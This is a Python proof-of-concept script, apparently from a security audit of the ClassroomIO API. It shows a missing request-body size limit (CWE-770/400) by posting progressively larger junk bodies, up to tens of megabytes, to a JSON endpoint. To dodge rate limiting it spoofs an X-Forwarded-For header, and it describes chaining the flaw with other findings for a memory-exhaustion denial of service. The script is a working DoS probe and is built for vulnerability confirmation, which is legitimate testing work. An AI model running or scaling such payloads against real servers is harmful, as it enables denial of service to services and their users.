#!/usr/bin/env python3
"""
VULN-037 (F-29) — No global JSON body-size limit (memory-exhaustion DoS).

Vulnerable code (targets/classroomio/):
  * apps/api/src/app.ts:52-106  — middleware chain has no `hono/body-limit`
  * apps/api/src/index.ts       — @hono/node-server serve() sets no maxRequestBodySize

Class: CWE-770 allocation of resources without limits / CWE-400 uncontrolled resource
consumption (DoS).

The flaw: no middleware caps request body size and the Node server sets no
`maxRequestBodySize`, so any JSON endpoint buffers an arbitrarily large body into memory
BEFORE Zod validation runs. An attacker (unauthenticated, or via VULN-018) sends many
large bodies to exhaust memory; VULN-036 means the rate limiter can't throttle them.

Exploitation idea: send progressively larger bodies and show the server BUFFERS them
(returns a normal handler/validation response, never `413 Payload Too Large`). We use an
INVALID body so it is rejected after buffering (no side effect) — the point is only that
the bytes were accepted and buffered.

A successful run proves: bodies far larger than any sane limit (here up to tens of MB)
are accepted and buffered rather than rejected with 413 → no body-size limit exists.
"""
import os
import sys
import requests

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from _common import log, banner, verdict  # noqa: E402

VULN = "VULN-037"
API = os.environ.get("API_URL", "http://localhost:21527")
# A JSON endpoint that parses the body. We send invalid JSON so it 400s AFTER buffering
# (no state change). Isolated rate-limit bucket via a fixed spoofed XFF.
TARGET = os.environ.get("BODY_PATH", "/agent/credits/purchase")
SIZES_MB = [int(x) for x in os.environ.get("BODY_SIZES", "1,10,30").split(",")]


def send(size_mb):
    # Non-JSON payload of `size_mb` megabytes with a JSON content-type: the server must
    # read the whole body to attempt to parse it. A body limit would 413 before that.
    payload = b"A" * (size_mb * 1024 * 1024)
    return requests.post(API + TARGET, data=payload, timeout=60,
                         headers={"Content-Type": "application/json",
                                  "Origin": "http://localhost:21526",
                                  "X-Forwarded-For": "203.0.113.209"})


def main():
    banner(VULN, "No global JSON body-size limit (memory-exhaustion DoS)")
    log("INFO", "app.ts:52-106 has no hono/body-limit; node-server sets no maxRequestBodySize")
    log("INFO", f"sending oversized bodies to {TARGET}; a 413 would mean a limit exists (it does not)")

    buffered = []
    for mb in SIZES_MB:
        log("STEP", f"POST {mb} MB body → expect the server to BUFFER it (not 413)")
        try:
            r = send(mb)
        except Exception as e:
            log("FAIL", f"  {mb}MB request error: {e}")
            continue
        log("INFO", f"  {mb} MB → HTTP {r.status_code} {str(r.text)[:80]!r}")
        if r.status_code == 413:
            log("PROOF", f"{mb}MB rejected with 413 — a body-size limit IS enforced at this size")
        else:
            # Any non-413 (400 bad-json / 401 / 200) means the whole body was read/buffered.
            buffered.append(mb)

    here = os.path.dirname(os.path.abspath(__file__))
    with open(os.path.join(here, "response.txt"), "w") as f:
        f.write(f"POST {TARGET} with oversized bodies; sizes buffered without 413: {buffered} MB\n")

    biggest = max(buffered) if buffered else 0
    if biggest >= 10:
        log("PROOF", f"bodies up to {biggest} MB were buffered with no 413 — the server allocates "
                     f"unbounded per-request memory; repeated concurrently (VULN-018 + VULN-036) → DoS")
        verdict(VULN, "CONFIRMED", f"no body-size limit — {biggest} MB body buffered, no 413")
        log("OK", "exploit confirmed — unbounded request-body buffering")
        sys.exit(0)

    verdict(VULN, "FAILED", f"largest buffered body was {biggest} MB (a limit may exist)")
    log("FAIL", "a body-size limit appears to be enforced")
    sys.exit(1)


if __name__ == "__main__":
    main()
